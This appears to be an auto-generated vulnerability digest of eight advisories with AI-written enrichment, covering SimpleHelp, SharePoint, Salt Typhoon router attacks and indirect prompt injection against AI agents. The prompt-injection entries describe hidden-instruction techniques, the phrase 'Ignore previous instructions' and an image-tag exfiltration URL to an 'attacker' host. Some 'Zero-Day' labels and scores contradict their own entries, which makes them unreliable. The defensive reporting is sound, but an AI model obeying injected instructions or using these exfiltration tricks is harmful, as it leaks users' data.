# Zero Day Pulse

> **Generated:** 2026-07-03 01:47 UTC &nbsp;|&nbsp; **Total:** 33 &nbsp;|&nbsp; 🔴 KEV: 0 &nbsp;|&nbsp; 🟠 Zero-Day: 11 &nbsp;|&nbsp; 🟡 High: 22 &nbsp;|&nbsp; ✨ Enriched: 10

---

## 1. 🟠 Zero-Day — Ransomware Actors Exploit Unpatched SimpleHelp Remote Monitoring and Management to Compromise Utility Billing Software Provider

**CVE:** `CVE-2024-57727` &nbsp;|&nbsp; **Source:** CISA US-CERT Alerts &nbsp;|&nbsp; **Published:** Thu, 12 Ju
**Reference:** <https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-163a>

> Summary The Cybersecurity and Infrastructure Security Agency (CISA) is releasing this advisory in response to ransomware actors leveraging unpatched instances of a vulnerability in SimpleHelp Remote Monitoring and Management (RMM) to compromise customers of a utility billing software provider. This incident reflects a broader pattern of ransomware actors targeting organizations through unpatched v…

**Parallel AI Enrichment:**

- **Technical Details:** CVE-2024-57727 is an unauthenticated path traversal vulnerability in SimpleHelp's HTTP request handling. Attackers craft HTTP requests containing directory-traversal sequences (e.g., ../) to download arbitrary files from the SimpleHelp host, including serverconfig.xml which contains hashed credentials for the SimpleHelpAdmin account and Technician accounts. The flaw can be chained with CVE-2024-57728 (arbitrary file upload) for unauthenticated remote code execution. No authentication is required and exploitation is over the network.
- **Affected Products:** SimpleHelp Remote Support / Remote Monitoring and Management (RMM) software version 5.5.7 and all earlier releases
- **CVSS Score:** 7.5
- **CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
- **Exploit Available:** Yes — public PoC and detailed exploit disclosure available. PoC repository: https://github.com/imjdl/CVE-2024-57727. Detailed technical disclosure with exploitation chain: https://horizon3.ai/attack-research/disclosures/critical-vulnerabilities-in-simplehelp-remote-support-software/
- **Patch Available:** Yes. Patched versions released January 2025: v5.5.8 (Jan 8, 2025), v5.4.10 (Jan 8, 2025), and v5.3.9 (Jan 13, 2025). Advisory: https://guides.simple-help.com/kb---security-vulnerabilities-01-2025
- **Active Exploitation:** Yes — confirmed active exploitation in the wild. Sources: CISA Advisory AA25-163A (Jun 12, 2025) documenting ransomware exploitation against a utility billing software provider; CISA KEV Catalog (added Feb 13, 2025); Huntress (corroborating ransomware abuse of SimpleHelp RMM); Broadcom/Symantec and Picus Security detection coverage.
- **Threat Actors:** DragonForce ransomware operators (per CISA Advisory AA25-163A, Jun 12, 2025); broader pattern of unaffiliated ransomware actors targeting unpatched SimpleHelp RMM since January 2025.
- **Mitigation:** 1. Upgrade immediately to SimpleHelp v5.5.8 (or v5.4.10/v5.3.9 for those branches). 2. Isolate the SimpleHelp server from the internet or stop the service until patched. 3. Reset the SimpleHelpAdmin password and rotate all Technician account passwords post-patch. 4. Restrict access via firewall/source-IP allow-listing for login and API endpoints; disable SimpleHelpAdmin and use an Administrator-level Technician account instead. 5. Rotate API tokens and restrict source IPs permitted to invoke the API. 6. Detection/IR: review serviceconfig.xml for compromise indicators; query https://<server>/allversions to confirm running version; monitor traffic; hunt for anomalous executables with three-letter filenames. 7. Maintain accurate asset inventory, clean offline backups, and avoid exposing remote administration services to the internet.
- **Vendor Advisory:** https://guides.simple-help.com/kb---security-vulnerabilities-01-2025

---

## 2. 🟠 Zero-Day — CISA: Microsoft SharePoint RCE flaw now actively exploited

**CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** Bleeping Computer &nbsp;|&nbsp; **Published:** 2026-07-02
**Reference:** <https://www.bleepingcomputer.com/news/security/cisa-microsoft-sharepoint-rce-flaw-now-actively-exploited/>

> CISA warned on Wednesday that attackers have begun exploiting a high-severity Microsoft SharePoint remote code execution vulnerability patched in May. [...]

**Parallel AI Enrichment:**

- **Technical Details:** CVE-2026-45659 is a deserialization of untrusted data vulnerability (CWE-502) in Microsoft SharePoint Server. The flaw stems from SharePoint deserializing untrusted data, which permits an authenticated attacker holding a minimum of Site Member permissions (i.e., low privilege — PR:L) to execute arbitrary code remotely on the vulnerable SharePoint Server over the network (AV:N). The attack has low complexity (AC:L), requires no user interaction (UI:N), and does not change scope (S:U), resulting in high impact to confidentiality, integrity, and availability (C:H/I:H/A:H). Microsoft states the vulnerability does not require admin or other elevated privileges.
- **Affected Products:** Microsoft SharePoint Server Subscription Edition, Microsoft SharePoint Server 2019, Microsoft SharePoint Enterprise Server 2016
- **CVSS Score:** 8.8
- **CVSS Vector:** AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
- **Exploit Available:** No confirmed public weaponized exploit. A draft/educational GitHub repository exists (https://github.com/HORKimhab/CVE-2026-45659) but contains no functional exploit code — it is an educational template only. No public PoC with working exploit code has been published at this time.
- **Patch Available:** Yes. Microsoft released official security updates on May 26, 2026 for CVE-2026-45659. Vendor advisory: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-45659
- **Active Exploitation:** Yes — confirmed active exploitation in the wild. CISA added CVE-2026-45659 to its Known Exploited Vulnerabilities (KEV) catalog on July 1, 2026 (announced publicly on July 2, 2026), setting a federal remediation deadline of July 4, 2026. Reporting sources: CISA KEV catalog (https://www.cisa.gov/known-exploited-vulnerabilities-catalog), Bleeping Computer (https://www.bleepingcomputer.com/news/security/cisa-microsoft-sharepoint-rce-flaw-now-actively-exploited/), SecurityWeek (https://www.securityweek.com/cisa-warns-of-actively-exploited-microsoft-sharepoint-vulnerability/), The Hacker News (https://thehackernews.com/2026/07/sharepoint-rce-cve-2026-45659-added-to.html), and Help Net Security. Shadowserver Foundation is tracking over 10,000 internet-exposed SharePoint servers that may be at risk. No specific threat actor, APT, or ransomware group has been publicly attributed to the exploitation.
- **Threat Actors:** None known
- **Mitigation:** Apply the Microsoft security updates released on May 26, 2026 (Patch Tuesday) for SharePoint Server Subscription Edition, SharePoint Server 2019, and SharePoint Enterprise Server 2016. U.S. federal agencies are required to remediate by July 4, 2026 per Binding Operational Directive (BOD) 26-04, or discontinue use of the product if mitigations cannot be applied. Key hardening: ensure internet-exposed SharePoint servers are patched promptly, restrict authenticated SharePoint access, monitor for suspicious activity, and review logs given Shadowserver Foundation is tracking over 10,000 SharePoint servers exposed online.
- **Vendor Advisory:** https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-45659

---

## 3. 🟠 Zero-Day — AI threats in the wild: The current state of prompt injections on the web

**CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** Google Security Blog &nbsp;|&nbsp; **Published:** 2026-04-23
**Reference:** <http://security.googleblog.com/2026/04/ai-threats-in-wild-current-state-of.html>

> Posted by Thomas Brunner, Yu-Han Liu, Moni Pande At Google, our Threat Intelligence teams are dedicated to staying ahead of real-world adversarial activity, proactively monitoring emerging threats before they can impact users. Right now, Indirect Prompt Injection (IPI) is a top priority for the security community, anticipating it as a primary attack vector for adversaries to target and compromise …

**Parallel AI Enrichment:**

- **Technical Details:** Indirect Prompt Injection (IPI) is a vulnerability class where an adversary embeds malicious natural-language instructions inside external content (websites, documents, emails, calendar invites, code files) that an AI agent/LLM later retrieves and processes. Attack flow: (1) Content Poisoning - the attacker shares a poisoned Google Doc, Calendar event, or Gmail message (or seeds instructions on a public webpage); (2) Trigger - a user makes a routine query causing the RAG system to retrieve the poisoned content into the model context; (3) Execution - the LLM follows embedded instructions (e.g., searching Workspace data, running shell commands, sending HTTP requests, modifying memory); (4) Exfiltration - sensitive data is leaked via side channels such as HTML <img src='http://attacker/x?data=...'> requests, PayPal payment URLs, or filesystem writes. Academic research formalizes this as a 'trigger fragment' (optimized via black-box embedding search to guarantee retrieval) plus an 'attack fragment' (encoding the objective), enabling end-to-end exploitation of both RAG pipelines and multi-step agentic workflows including SSH-key exfiltration via a single poisoned email in GPT-4o.
- **Affected Products:** Google Gemini (including Gemini Enterprise and Workspace with Gemini), Google Vertex AI Search, Google Antigravity IDE (agentic IDE, patched Feb 28 2026), GitHub Copilot, Cursor, Claude Code, AI-powered CI/CD code reviewers, GPT-4o and 8 tested embedding models (ArXiv study). Specific version numbers are not publicly disclosed for Gemini/Gemini Enterprise/Vertex AI Search.
- **CVSS Score:** 0.0
- **CVSS Vector:** CVSS vector unavailable.
- **Exploit Available:** Yes - multiple public PoCs and weaponized exploits exist:
- Forcepoint X-Labs: 10 verified in-the-wild IPI payloads (financial fraud, data destruction, API key exfiltration) - https://www.forcepoint.com/blog/x-labs/indirect-prompt-injection-payloads
- Noma Labs: GeminiJack zero-click exploit targeting Gemini Enterprise/Vertex AI Search - https://noma.security/blog/geminijack-google-gemini-zero-click-vulnerability
- Pillar Security: Antigravity IDE prompt-injection-to-RCE/sandbox-escape PoC - https://www.pillar.security/blog/prompt-injection-leads-to-rce-and-sandbox-escape-in-antigravity
- Academic: End-to-end IPI exploits against RAG and agentic systems (ArXiv:2601.07072) - https://arxiv.org/abs/2601.07072
- Unit 42: Web-based IPI against AI agent ad-checker systems - https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/
- **Patch Available:** Partial / per-vendor fixes have shipped but the underlying class is not fully patchable:
- Google Gemini Enterprise / Vertex AI Search (GeminiJack): patched by Google prior to Noma Labs' public disclosure on December 8, 2025 - https://noma.security/blog/geminijack-google-gemini-zero-click-vulnerability
- Google Antigravity IDE (prompt-injection-to-RCE/sandbox-escape): patched by Google on February 28, 2026 - https://www.pillar.security/blog/prompt-injection-leads-to-rce-and-sandbox-escape-in-antigravity and https://thehackernews.com/2026/04/google-patches-antigravity-ide-flaw.html
- GitHub Copilot, Cursor, Claude Code, AI CI/CD reviewers: vendor guidance and hardening recommended; consult each vendor for current status. No universal patch exists for the IPI class itself; mitigations must be applied at the application/agent layer.
- **Active Exploitation:** Yes - confirmed active in-the-wild exploitation reported by multiple independent sources:
- Google Threat Intelligence (Brunner, Liu, Pande): documented a 32% relative increase in the malicious prompt-injection category between November 2025 and February 2026 on the public web - http://security.googleblog.com/2026/04/ai-threats-in-wild-current-state-of.html
- Forcepoint X-Labs (Apr 22, 2026): 10 verified in-the-wild IPI payloads observed on live websites spanning financial fraud, data destruction, API key exfiltration, and AI denial-of-service - https://www.forcepoint.com/blog/x-labs/indirect-prompt-injection-payloads
- Noma Labs (Dec 8, 2025): GeminiJack zero-click exploit demonstrated against Google Gemini Enterprise and previously Vertex AI Search - https://noma.security/blog/geminijack-google-gemini-zero-click-vulnerability
- Pillar Security (Apr 2026): Antigravity IDE prompt-injection-to-RCE/sandbox-escape chain - https://www.pillar.security/blog/prompt-injection-leads-to-rce-and-sandbox-escape-in-antigravity
- Unit 42 / Palo Alto Networks (Mar 3, 2026): web-based IPI observed in the wild targeting AI agent ad-checker systems - https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/
- **Threat Actors:** None known. While Google Threat Intelligence and Forcepoint X-Labs have documented confirmed in-the-wild IPI exploitation, no specific threat actor group, APT campaign, or ransomware operator has been publicly attributed to these attacks.
- **Mitigation:** No single patch fully fixes IPI; layered defenses are required: (1) Scope reduction - audit agent permissions, remove payment/destructive-write/email-send capabilities from agents ingesting untrusted content, enforce read-only tool access for web-browsing agents; (2) Boundary enforcement - explicitly tag retrieved content vs. operator instructions, sign/hash indexed RAG documents, enforce 'retrieved content = data, never instructions' at the framework level; (3) Output monitoring - deploy semantic monitoring on tool calls (HTTP, shell, payment, email), log and inspect memory writes for instruction-shaped content; (4) Tool hardening - restrict IDE agents from fetching untrusted URLs unless in sandboxed mode; (5) Validation - run quarterly IPI red-team exercises; (6) Google-specific - leverage the AI Vulnerability Reward Program and ensure Gemini/Antigravity are kept current with vendor updates; (7) Carefully define trust boundaries and monitor any AI system with access to sensitive data.
- **Vendor Advisory:** http://security.googleblog.com/2026/04/ai-threats-in-wild-current-state-of.html

---

## 4. 🟠 Zero-Day — Google Workspace’s continuous approach to mitigating indirect prompt injections

**CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** Google Security Blog &nbsp;|&nbsp; **Published:** 2026-04-02
**Reference:** <http://security.googleblog.com/2026/04/google-workspaces-continuous-approach.html>

> Posted by Adam Gavish, Google GenAI Security Team Indirect prompt injection (IPI) is an evolving threat vector targeting users of complex AI applications with multiple data sources, such as Workspace with Gemini. This technique enables the attacker to influence the behavior of an LLM by injecting malicious instructions into the data or tools used by the LLM as it completes the user’s query. This m…

**Parallel AI Enrichment:**

- **Technical Details:** Indirect Prompt Injection (IPI) is an attack class in which adversaries influence LLM behavior by embedding malicious instructions into data or tools the model consumes while completing a user's query — sometimes with no direct user input required. Common concealment techniques include HTML comments, CSS display:none, 1px font or near-transparent text, aria-hidden attributes, meta-tag spoofing, and trigger phrases like 'Ignore previous instructions' or 'If you are an LLM.' In RAG systems (e.g., Gemini Enterprise), attackers poison shared Google Docs, Calendar invitations, or Gmail messages; embedded instructions are treated as legitimate commands, exfiltrating data via outbound HTTP requests disguised as external image tags.
- **Affected Products:** Workspace with Gemini, Gemini Enterprise, Vertex AI Search, Gemini app, Gemini in Workspace apps (Gmail, Docs editors, Drive, Chat), and LLM-powered AI agents generally
- **CVSS Score:** 8.5
- **CVSS Vector:** CVSS vector unavailable.
- **Exploit Available:** Yes — multiple public PoCs/weaponized exploits exist: GeminiJack (Noma Labs, Dec 8, 2025) — zero-click IPI against Gemini Enterprise/Vertex AI Search exfiltrating Gmail/Calendar/Docs data via disguised image tags — https://noma.security/blog/geminijack-google-gemini-zero-click-vulnerability/; 10 IPI payloads caught in the wild (Forcepoint X-Labs, Apr 22, 2026) — https://www.forcepoint.com/blog/x-labs/indirect-prompt-injection-payloads; Phishing for Gemini (0DIN, Jul 10, 2025) — IPI against 'Summarize this email' feature — https://0din.ai/blog/phishing-for-gemini
- **Patch Available:** No traditional single patch — mitigations are delivered as continuous model updates and layered defense refinements. For GeminiJack, Google deployed RAG processing pipeline updates and fully separated Vertex AI Search from Gemini Enterprise. Reference: http://security.googleblog.com/2026/04/google-workspaces-continuous-approach.html
- **Active Exploitation:** Yes — confirmed active exploitation in the wild: Google observed a 32% increase in malicious IPIs between November 2025 and February 2026 (cited by Help Net Security, Apr 24, 2026 — https://www.helpnetsecurity.com/2026/04/24/indirect-prompt-injection-in-the-wild/); Forcepoint X-Labs identified 10 verified IPI payloads on live web infrastructure (Apr 22, 2026 — https://www.forcepoint.com/blog/x-labs/indirect-prompt-injection-payloads); Multiple independent researcher disclosures demonstrate reproducible exploitation.
- **Threat Actors:** None known
- **Mitigation:** Google's layered defense strategy includes: (1) Deterministic defenses — user confirmation prompts, URL sanitization, tool-chaining policies, Policy Engine; (2) ML-based defenses — retraining on synthetic attack data; (3) LLM-based defenses — iterative prompt engineering; (4) Model hardening — improving Gemini's intrinsic ability to ignore harmful commands; (5) Prompt-injection content classifiers; (6) Security thought reinforcement via system instructions; (7) Markdown sanitization and suspicious URL redaction (Safe Browsing); (8) User-confirmation framework (HITL) for risky operations; (9) End-user security mitigation notifications; (10) Proactive discovery via red-teaming, AI VRP, and OSINT monitoring; (11) Synthetic data generation ('Simula'). Hardening advice: enforce strict data-instruction boundary, perform inbound HTML linting, apply LLM firewalls, post-processing filters for suspicious phone numbers/URLs.
- **Vendor Advisory:** http://security.googleblog.com/2026/04/google-workspaces-continuous-approach.html

---

## 5. 🟠 Zero-Day — Architecting Security for Agentic Capabilities in Chrome

**CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** Google Security Blog &nbsp;|&nbsp; **Published:** 2025-12-08
**Reference:** <http://security.googleblog.com/2025/12/architecting-security-for-agentic.html>

> Posted by Nathan Parker, Chrome security team Chrome has been advancing the web’s security for well over 15 years, and we’re committed to meeting new challenges and opportunities with AI. Billions of people trust Chrome to keep them safe by default, and this is a responsibility we take seriously. Following the recent launch of Gemini in Chrome and the preview of agentic capabilities , we want to s…

**Parallel AI Enrichment:**

- **Technical Details:** The blog post describes indirect prompt injection as the primary threat to agentic browsers: malicious content embedded in web pages (malicious sites, third-party iframe content, user-generated content) injects instructions into the Gemini planning model, potentially causing the agent to take unwanted actions like initiating financial transactions, exfiltrating sensitive data, or leaking logged-in site data. Chrome's layered defenses include: (1) a User Alignment Critic (a second high-trust LLM auditing planner outputs); (2) Agent Origin Sets (tracking the read-writeable origin set and gating cross-origin actions); (3) prompt-injection classifier run in parallel with planning-model inference; (4) deterministic URL allow-listing; (5) user confirmation prompts for sensitive actions; (6) spotlighting techniques directing the model to prioritize user/system instructions over page content.
- **Affected Products:** Google Chrome (versions prior to 143.0.7499.192) with Gemini in Chrome agentic capabilities preview; Google Gemini Enterprise and Google Vertex AI Search (versions unspecified)
- **CVSS Score:** 8.8
- **CVSS Vector:** CVSS vector unavailable.
- **Exploit Available:** A proof-of-concept for the related GeminiJack zero-click indirect prompt injection attack was published by Noma Labs at https://noma.security/blog/geminijack-google-gemini-zero-click-vulnerability/. For the related CVE-2026-0628, malicious Chrome extensions could exploit the declarativeNetRequest API to inject JavaScript into the Gemini side panel.
- **Patch Available:** The architectural blog post does not announce a single patch (it describes a multi-layer ongoing defense strategy). For related CVE-2026-0628: Patched in Google Chrome version 143.0.7499.192—see https://chromereleases.googleblog.com/2026/01/stable-channel-update-for-desktop.html. For GeminiJack: Google deployed mitigations in late 2025.
- **Active Exploitation:** Confirmed active exploitation was reported for the related CVE-2026-0628. No confirmed in-the-wild exploitation has been reported specifically for the broader class of indirect prompt injection described in the architectural post. GeminiJack was a research discovery disclosed responsibly to Google (reported May 2025, fixed late 2025); no in-the-wild attacks were attributed to specific threat actors.
- **Threat Actors:** None known
- **Mitigation:** Chrome's layered defenses against indirect prompt injection include: (1) User Alignment Critic—a second high-trust LLM auditing planner outputs; (2) Agent Origin Sets—tracking the read-writeable origin set and gating cross-origin actions; (3) prompt-injection classifier run in parallel with planning-model inference; (4) deterministic URL allow-listing; (5) user confirmation prompts for sensitive actions; (6) spotlighting techniques directing the model to prioritize user/system instructions over page content; (7) Safe Browsing real-time scanning plus on-device AI scam detection; (8) updated Vulnerability Rewards Program guidelines for agentic-capability research. For organizations using Gemini Enterprise: carefully consider trust boundaries around user-controlled content fed to AI and monitor for anomalous data exfiltration patterns. Keep Chrome updated to >= 143.0.7499.192 to mitigate CVE-2026-0628.
- **Vendor Advisory:** http://security.googleblog.com/2025/12/architecting-security-for-agentic.html

---

## 6. 🟠 Zero-Day — Rust in Android: move fast and fix things

**CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** Google Security Blog &nbsp;|&nbsp; **Published:** 2025-11-13
**Reference:** <http://security.googleblog.com/2025/11/rust-in-android-move-fast-fix-things.html>

> Posted by Jeff Vander Stoep, Android Last year, we wrote about why a memory safety strategy that focuses on vulnerability prevention in new code quickly yields durable and compounding gains. This year we look at how this approach isn’t just fixing things, but helping us move faster . The 2025 data continues to validate the approach, with memory safety vulnerabilities falling below 20% of total vul…

**Parallel AI Enrichment:**

- **Technical Details:** High-level programmatic summary (not a single-vulnerability disclosure). The blog reports memory-safety vulnerability rates and attributes reductions to Rust adoption — i.e., class-level memory corruption / memory-safety bugs (use-after-free, buffer overflows, etc.) are the addressed class, and the post describes Rust-driven prevention rather than a single exploit vector.
- **Affected Products:** Android platform (first-party and third-party/open-source code changes); specific product versions unavailable.
- **CVSS Score:** 0.0
- **CVSS Vector:** CVSS vector unavailable.
- **Exploit Available:** No public proof‑of‑concept (PoC) or weaponized exploit is reported in the cited sources for the material summarized in the blog post.
- **Patch Available:** Not applicable to a single vulnerability; the post is an informational program/status update. Android Security Bulletins are the venue for per‑CVE patches (no patch URL is referenced by the blog post itself).
- **Active Exploitation:** No confirmed active exploitation tied to the blog’s summary statistics is reported in the cited sources.
- **Threat Actors:** None known
- **Mitigation:** Adopt memory‑safety prevention measures described by the vendor: use Rust for new Android platform code and apply engineering controls that reduce memory-safety vulnerabilities (the blog describes this programmatic mitigation rather than per‑vulnerability workarounds).
- **Vendor Advisory:** https://blog.google/security/rust-in-android-move-fast-fix-things/

---

## 7. 🟠 Zero-Day — Mitigating prompt injection attacks with a layered defense strategy

**CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** Google Security Blog &nbsp;|&nbsp; **Published:** 2025-06-13
**Reference:** <http://security.googleblog.com/2025/06/mitigating-prompt-injection-attacks.html>

> Posted by Adam Gavish, Google GenAI Security Team With the rapid adoption of generative AI, a new wave of threats is emerging across the industry with the aim of manipulating the AI systems themselves. One such emerging attack vector is indirect prompt injections. Unlike direct prompt injections, where an attacker directly inputs malicious commands into a prompt, indirect prompt injections involve…

**Parallel AI Enrichment:**

- **Technical Details:** Indirect prompt injection is an attack class in which an attacker embeds hidden malicious natural-language instructions inside external content (emails, documents, calendar invites, web pages, images) that a generative AI assistant later ingests. When the LLM processes that content as part of a user-driven task, the hidden instructions are treated as authoritative, causing the model to take rogue actions such as exfiltrating user data, manipulating summaries, generating phishing responses, or invoking tools. Specific mechanisms include: (1) invisible HTML/CSS tricks (font-size: 0, white-on-white text, off-screen positioning, opacity: 0) so hidden text is invisible to humans but parsed by LLM ingestion pipelines; (2) markdown / URL injection enabling data exfiltration to attacker-controlled endpoints; (3) 'EchoLeak'-style LLM Scope Violation, where prompt injection is combined with a Content Security Policy bypass to coerce a zero-click exfiltration of in-scope data via crafted image URLs that the assistant renders on the user's behalf.
- **Affected Products:** Google Gemini (app and Gemini in Google Workspace), Gmail, Google Docs, Google Calendar — as discussed in the advisory's layered defense strategy. The advisory also references the EchoLeak example (CVE-2025-32711) which affects Microsoft 365 Copilot (a competitor product used as illustration, not a Google product).
- **CVSS Score:** 0.0
- **CVSS Vector:** CVSS vector unavailable.
- **Exploit Available:** Yes — multiple public PoCs exist for the broader class of indirect prompt injection attacks. Examples include: (1) a benign public PoC targeting AI browsers (ChatGPT Atlas, Perplexity Comet) at https://github.com/brennanbrown/atlas-prompt-injection-poc; (2) SafeBreach Labs published an indirect prompt injection exploit against Gemini's voice assistant in instant messaging apps at https://www.safebreach.com/blog/gemini-voice-assistant-prompt-injection-exploit/; (3) the original EchoLeak (CVE-2025-32711) PoC against M365 Copilot was published by Aim Security at https://www.aim.security/lp/aim-labs-echoleak-m365. Per the Google blog, at the time of publication no public PoC existed for the Google-specific mitigations being discussed, but the technique class is well-documented.
- **Patch Available:** No traditional software patch is applicable — the blog post itself is not a CVE. Google states that the described defenses are already deployed in Gemini 2.5 and Google Workspace. For the referenced CVE-2025-32711 (EchoLeak in Microsoft 365 Copilot), Microsoft applied server-side fixes in May 2025 and stated no customer action is required (advisory: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-32711).
- **Active Exploitation:** Confirmed active exploitation of indirect prompt injection as a class in the wild, but with limited sophistication. Google's April 2026 'AI threats in the wild' post (https://blog.google/security/prompt-injections-web/) reports attackers are seeding prompt injections on public websites with goals ranging from SEO manipulation and pranks to attempted data exfiltration and file destruction, with a 32% relative increase in malicious-category detections between November 2025 and February 2026. For the specific EchoLeak reference (CVE-2025-32711), SOC Prime and Field Effect report no evidence of real-world exploitation at time of disclosure.
- **Threat Actors:** No threat actors are known to be specifically exploiting this published guidance. However, Google Threat Intelligence Group (GTIG) has documented that government-backed APT groups from the DPRK, Iran, PRC, and Russia — including APT42, UNC2970, APT31, UNC795, and APT41 — are misusing Gemini across their operations (reconnaissance, phishing lure creation, code tasks). Per Google's April 2026 follow-up post, attackers are experimenting with indirect prompt injection by seeding malicious instructions on public websites, though no specific named campaigns were disclosed.
- **Mitigation:** Google describes a layered defense strategy: (1) Model hardening via adversarial training in Gemini 2.5 models; (2) proprietary ML-based content classifiers that detect and filter malicious instructions embedded in inbound emails and files before they reach the model; (3) 'security thought reinforcement' — targeted system instructions that direct the LLM to prioritize the user's task and ignore adversarial content; (4) markdown sanitization and URL redaction, removing external image references and blocking suspicious links via Google Safe Browsing; (5) a Human-In-The-Loop (HITL) confirmation framework requiring user approval for risky actions (e.g., deleting calendar events); (6) end-user contextual security notifications and 'Learn more' links when an attack is detected and mitigated. For the EchoLeak reference case, Microsoft applied server-side mitigations; recommended defenses include DLP sensitivity tags that block Copilot from processing external mail and real-time LLM scope-violation guardrails.
- **Vendor Advisory:** http://security.googleblog.com/2025/06/mitigating-prompt-injection-attacks.html

---

## 8. 🟠 Zero-Day — Countering Chinese State-Sponsored Actors Compromise of Networks Worldwide to Feed Global Espionage System

**CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** CISA US-CERT Alerts &nbsp;|&nbsp; **Published:** Mon, 25 Au
**Reference:** <https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a>

> Executive summary People’s Republic of China (PRC) state-sponsored cyber threat actors are targeting networks globally, including, but not limited to, telecommunications, government, transportation, lodging, and military infrastructure networks. While these actors focus on large backbone routers of major telecommunications providers, as well as provider edge (PE) and customer edge (CE) routers, th…

**Parallel AI Enrichment:**

- **Technical Details:** PRC state-sponsored actors gain initial access by exploiting known vulnerabilities in internet-exposed network edge devices (routers, VPN gateways, firewalls) — including Cisco IOS/IOS XE Smart Install and Web UI flaws (CVE-2018-0171, CVE-2023-20198, CVE-2023-20273), Ivanti Connect Secure / Policy Secure command-injection and auth-bypass flaws (CVE-2023-46805, CVE-2024-21887), Palo Alto PAN-OS/GlobalProtect command-injection (CVE-2024-3400), and Cisco Smart Software Manager On-Prem password-change flaw (CVE-2024-20419, CVE-2024-20422). After gaining access, they: tamper with router/switch configurations (modify ACLs, change SNMP community strings, disable logging, create local user accounts and 'access-list 20' ACLs); abuse GRE/IPsec tunnels and Guest Shell (chvrf / dohost commands) for persistence and command-and-control; intercept TACACS+ and RADIUS authentication traffic to harvest credentials (including TACACS+ redirection to attacker-controlled servers); capture PCAP / network traffic for credential theft and data exfiltration; pivot from compromised edge devices into telecom backbone and provider/customer edge (PE/CE) networks to reach telecommunications, government, transportation, lodging, and military infrastructure targets. CISA explicitly notes that exploitation of zero-day vulnerabilities has NOT been observed.
- **Affected Products:** Cisco IOS and IOS XE (with Smart Install enabled; Web UI), Cisco Guest Shell (IOS XE / NX-OS), Cisco Smart Software Manager On-Prem (SSM On-Prem) — including release 8-202206 and prior, Cisco IOS XR, Ivanti Connect Secure, Ivanti Policy Secure, Palo Alto Networks PAN-OS / GlobalProtect, provider edge (PE) and customer edge (CE) routers, large backbone routers of telecommunications providers
- **CVSS Score:** 6.4
- **CVSS Vector:** CVSS vector unavailable. AA25-239A is an aggregated multi-vendor/multi-CVE advisory; no single CVSS v3 vector is assigned to the advisory itself. Individual CVEs referenced in the advisory have their own vectors (e.g., CVE-2024-20419, CVE-2024-20422, CVE-2023-20198, CVE-2023-20273, CVE-2018-0171, CVE-2023-46805, CVE-2024-21887, CVE-2024-3400).
- **Exploit Available:** Yes. Public proof-of-concept and weaponized exploits exist for several of the underlying CVEs cited in the advisory. Example: an exploit for CVE-2024-20419 (Cisco Smart Software Manager On-Prem) is published on Exploit-DB at https://www.exploit-db.com/exploits/52155, and CVE-2023-20198 has public PoCs and Metasploit modules. CISA states the actors 'relied heavily on known CVEs in network edge devices rather than zero-days.'
- **Patch Available:** Yes — vendor patches are available for the underlying CVEs referenced in the advisory, but AA25-239A itself is an aggregated multi-vendor advisory and does not point to a single vendor patch URL. Patches must be applied per vendor: Cisco security advisories at https://sec.cloudapps.cisco.com/security/center/publicationListing.x (e.g., https://sec.cloudapps.cisco.com/security/center/resources/asa_ftd_continued_attacks), Ivanti security advisories for Connect Secure / Policy Secure, and Palo Alto Networks security advisories for PAN-OS / GlobalProtect. CISA explicitly recommends applying vendor updates as the primary remediation.
- **Active Exploitation:** Yes — confirmed active exploitation in the wild. CISA, NSA, and partner agencies observed PRC state-sponsored actors (notably Salt Typhoon) actively exploiting the referenced vulnerabilities to compromise telecommunications backbone routers and PE/CE devices worldwide since at least 2021. Reporting sources: CISA Advisory AA25-239A (https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a), NSA press release (https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/4287371/), FBI/IC3 PSA (https://ic3.gov/CSA/2025/250827.pdf), and partner Five Eyes / Singapore IMDA advisory (https://www.imda.gov.sg/-/media/imda/files/regulations-and-licensing/regulations/advisories/infocomm-media-cyber-security/salt-typhoon-operation-network-device-exploitation.pdf). GreyNoise has observed exploitation of CVE-2018-0171 attributed to the Salt Typhoon campaign.
- **Threat Actors:** Salt Typhoon, OPERATOR PANDA, RedMike, UNC5807, GhostEmperor, Volt Typhoon, APT40 (Kryptonite Panda) — PRC state-sponsored cyber threat actors
- **Mitigation:** Mitigations per CISA AA25-239A: (1) Apply vendor patches for all referenced CVEs on internet-exposed devices (Cisco IOS/IOS XE, Ivanti Connect/Policy Secure, Palo Alto PAN-OS, Cisco SSM On-Prem); (2) Baseline and audit router configurations — regularly pull running configs and compare against authorized baselines; review ACLs, remote-access configs, routing tables, and verify PCAP commands; (3) Enforce secure management protocols — require SNMPv3 with auth+privacy, eliminate weak/default community strings, restrict SNMP writes to trusted hosts, disable unused services/ports/legacy protocols (Telnet, unencrypted HTTP); (4) Harden authentication — enforce MFA, audit local accounts and permissions, monitor for abnormal TACACS+/RADIUS server changes or redirection; (5) Audit containerized services — monitor Cisco Guest Shell via syslog/AAA accounting/container logs/off-box telemetry, hunt for suspicious commands (guestshell enable, guestshell run bash, chvrf, dohost), disable Guest Shell if not operationally required; (6) Validate firmware/images against vendor-provided hashes, enable signed-image enforcement and configuration-integrity features; (7) Monitor for unauthorized ACL modifications, new tunnels, routing changes, FTP/TFTP to unauthorized destinations, and management services on non-standard ports (e.g., SSH on 22→22/xxx22, HTTPS on 18xxx, IOS XR sshd_operns on TCP/57722); (8) Restrict management access to trusted networks and segment management VRFs; (9) Prioritize patching of critical vulnerabilities and conduct threat hunting for backdoors such as sshd_opens and rogue admin accounts.
- **Vendor Advisory:** https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a

---

